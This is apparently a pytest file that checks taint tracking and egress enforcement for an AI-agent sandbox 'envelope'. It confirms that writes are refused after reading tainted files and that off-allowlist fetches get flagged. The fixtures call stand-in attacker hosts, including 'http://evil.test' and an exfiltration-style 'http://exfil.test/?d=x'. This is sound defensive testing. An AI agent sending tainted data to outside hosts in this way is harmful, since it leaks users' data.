from pathlib import Path

from boundary.agent import Agent
from boundary.envelope import Envelope, EnvelopeEvent, EnvelopeRunner, _make_enforced_tool
from boundary.taint import TaintStore
from boundary.tools.registry import Tool, ToolRegistry
from boundary.tools.workspace import Workspace
from boundary.tools.fs import register_fs_tools


def test_agent_retains_driver_and_egress():
    a = Agent(name="t", system_prompt="x", workspace="/tmp/ws-agent-attr",
              client=object(), enable_shell=False, transcript=False,
              sandbox_driver="srt", egress_allowlist=["api.example.com"])
    assert a.sandbox_driver == "srt"
    assert a.egress_allowlist == ["api.example.com"]


def _fetch_tool():
    def fetch_url(url: str, reason: str = "") -> str:
        return f"<untrusted {url}>"
    return Tool(name="fetch_url", description="x",
                parameters={"type": "object",
                            "properties": {"url": {"type": "string"},
                                           "reason": {"type": "string"}},
                            "required": ["url", "reason"]},
                fn=fetch_url, kind="external")


def _harness(tmp_path, env, *, store=None, driver="seatbelt", egress=None):
    env.require_staging = False
    ws = Workspace(root=tmp_path)
    base = ToolRegistry()
    register_fs_tools(base, ws)
    base.register(_fetch_tool())
    counters, events, iter_ref = {}, [], [1]
    enforced = ToolRegistry()
    for tool in base._tools.values():
        enforced.register(_make_enforced_tool(
            tool, env, counters, events, iter_ref,
            store=store, sandbox_driver=driver, egress_allowlist=egress or []))
    return enforced, counters, events, ws


def test_read_of_tainted_file_taints_run(tmp_path, monkeypatch):
    monkeypatch.setenv("BOUNDARY_HOME", str(tmp_path / "bh"))
    (tmp_path / "intel.md").write_text("untrusted", encoding="utf-8")
    store = TaintStore.load(tmp_path); store.mark_file("intel.md")
    env = Envelope(writable_paths=["out.md"], on_taint="refuse")
    enforced, counters, events, ws = _harness(tmp_path, env, store=store)
    enforced.get("read_file").call({"path": "intel.md"})
    r = enforced.get("write_file").call({"path": "out.md", "content": "x", "reason": "r"})
    assert "ENVELOPE REFUSED" in r and "taint" in r.lower(), r


def test_clean_read_not_tainted_despite_tainted_ledger(tmp_path, monkeypatch):
    monkeypatch.setenv("BOUNDARY_HOME", str(tmp_path / "bh"))
    (tmp_path / "intel.md").write_text("u", encoding="utf-8")
    (tmp_path / "clean.md").write_text("ok", encoding="utf-8")
    store = TaintStore.load(tmp_path); store.mark_file("intel.md")
    env = Envelope(writable_paths=["out.md"], on_taint="refuse")
    enforced, counters, events, ws = _harness(tmp_path, env, store=store)
    enforced.get("read_file").call({"path": "clean.md"})
    r = enforced.get("write_file").call({"path": "out.md", "content": "x", "reason": "r"})
    assert r.startswith("wrote "), r


def test_write_while_tainted_marks_output(tmp_path, monkeypatch):
    monkeypatch.setenv("BOUNDARY_HOME", str(tmp_path / "bh"))
    store = TaintStore.load(tmp_path)
    env = Envelope(writable_paths=["out.md"], on_taint="warn")
    enforced, counters, events, ws = _harness(tmp_path, env, store=store)
    enforced.get("fetch_url").call({"url": "http://evil.test", "reason": "r"})
    enforced.get("write_file").call({"path": "out.md", "content": "x", "reason": "r"})
    assert TaintStore.load(tmp_path).is_tainted("out.md")


def test_bash_taints_unless_srt(tmp_path, monkeypatch):
    monkeypatch.setenv("BOUNDARY_HOME", str(tmp_path / "bh"))
    env = Envelope(writable_paths=["out.md"], on_taint="warn", allow_bash=True)
    counters, events = {}, []

    def bash(command: str, reason: str = "") -> str:
        return "ok"

    bash_tool = Tool(name="bash", description="x",
                     parameters={"type": "object",
                                 "properties": {"command": {"type": "string"}},
                                 "required": ["command"]},
                     fn=bash, kind="write")
    enforced = _make_enforced_tool(
        bash_tool, env, counters, events, [1],
        store=TaintStore.load(tmp_path), sandbox_driver="seatbelt")
    enforced.call({"command": "python3 -c 'import urllib'", "reason": "r"})
    assert counters.get("tainted_reads", 0) >= 1


def test_taint_egress_nudge_when_tainted_and_offlist(tmp_path, monkeypatch):
    monkeypatch.setenv("BOUNDARY_HOME", str(tmp_path / "bh"))
    env = Envelope(writable_paths=["out.md"], on_taint="warn")
    enforced, counters, events, ws = _harness(
        tmp_path, env, store=TaintStore.load(tmp_path), egress=["safe.example.com"])
    enforced.get("fetch_url").call({"url": "http://evil.test/a", "reason": "r"})
    enforced.get("fetch_url").call({"url": "http://exfil.test/?d=x", "reason": "r"})
    assert any(e.kind == "taint_egress" for e in events)


class _StubClient:
    model = "claude-sonnet-4.6"

    def __init__(self):
        self.calls = 0

    def chat(self, messages, tools=None, **kw):
        from boundary.clients.base import ChatResponse, Message
        self.calls += 1
        return ChatResponse(message=Message(role="assistant", content="done"),
                            finish_reason="stop", input_tokens=1, output_tokens=1,
                            cached_input_tokens=0)


def test_envelope_end_logs_sandbox_driver(tmp_path, monkeypatch):
    import json
    monkeypatch.setenv("BOUNDARY_HOME", str(tmp_path / "bh"))
    a = Agent(name="t", system_prompt="x", workspace=str(tmp_path / "ws"),
              client=_StubClient(), enable_shell=False, enable_fs=True,
              sandbox_driver="seatbelt", transcript=True)
    env = Envelope(writable_paths=["out.md"], require_staging=False)
    EnvelopeRunner(a, env).run("do it")
    text = a.transcript.path.read_text(encoding="utf-8")
    end = [json.loads(l) for l in text.splitlines()
           if l and json.loads(l).get("type") == "envelope_end"][0]
    assert end["sandbox_driver"] == "seatbelt"
    assert "egress_allowlist" in end
